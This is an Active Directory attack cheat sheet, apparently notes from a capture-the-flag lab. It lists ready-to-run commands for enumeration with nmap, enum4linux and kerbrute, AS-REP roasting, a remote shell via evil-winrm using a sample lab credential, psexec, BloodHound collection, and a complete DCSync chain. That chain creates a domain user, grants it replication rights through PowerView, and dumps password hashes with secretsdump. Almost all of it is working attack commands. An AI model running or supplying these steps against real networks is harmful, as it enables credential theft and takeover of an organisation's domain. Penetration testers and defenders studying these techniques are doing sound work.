# Active Directory

## Enumeration

Nmap: `sudo nmap -n -sV --script "ldap* and not brute" <IP>`

Enum4Linux: `enum4linux <IP>`

Kerbrute: `./kerbrute userenum -d <Domain Controller> --dc <Target IP> /<Wordlst>`

## SMB

If Port 5985 is OPEN, you may be able to access a shell with valid SMB Credentials

SMB Shell: `evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice`

SMB Connection: `smbclient \\<IP>\<Share> -U '<Username>'`

Check For Anonymous Access:

`smbmap -H <IP>`

`smbclient \\\\<IP>\<Share> -N`

`smbclient \\\\<IP>\\<Share> -c 'recurse;ls' -N`

## Impacket Scripts

AS-REP Roasting

GetNPUsers: 

`sudo python3 GetNPUsers.py <Domain Controller>/<Valid Username> -no-pass`

`sudo python3 GetNPUsers.py <Domain Controller>/ -dc-ip <IP> -request`

Hash Dump After DCSync

SecretsDump: `sudo python3 secretsdump.py <Domain Controller>/<New Username>@<IP>`

Remote PowerShell Connection

PsExec: `python psexec.py <Domain Controller>/<Username>:<Password>@<IP>`

## Bloodhound

Install: `sudo pip3 install bloodhound && wget https://github.com/BloodHoundAD/BloodHound/releases/download/4.0.3/BloodHound-linux-x64.zip && unzip BloodHound-linux-x64.zip && mv BloodHound-linux-x64/BloodHound . && rm -rf BloodHound-linux-x64.zip BloodHound-linux-x64/`

Get Info: `bloodhound-python -d <Domain Controller> -u <Valid Username> -p <Password> -gc <Gloabl Catalog> -c all -ns <IP>`

Neo4j Console: `neo4j console`

# PowerView

Download: `curl -O https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1`

# DCSync Attack 

`net user <New Username> <New Password> /add /domain`

`net group "Exchange Windows Permissions" <New Username> /add /domain`

Import PowerView

`$pass = convertto-securestring '<New Password>' -AsPlainText -Force`

`$cred = New-Object System.Management.Automation.PSCredential('<Domain Controller>\<New Username>', $pass)`

`Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=<dc>,DC=<dc>" -PrincipalIdentity "<New Username>" -Rights DCSync`

# Extra Resources

[What is AS-REP Roasting?](https://stealthbits.com/blog/cracking-active-directory-passwords-with-as-rep-roasting/)

[Kuberos DCSync Attacks Explained](https://www.qomplx.com/kerberos_dcsync_attacks_explained/)

[PowerView 3.0 Tips & Tricks](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
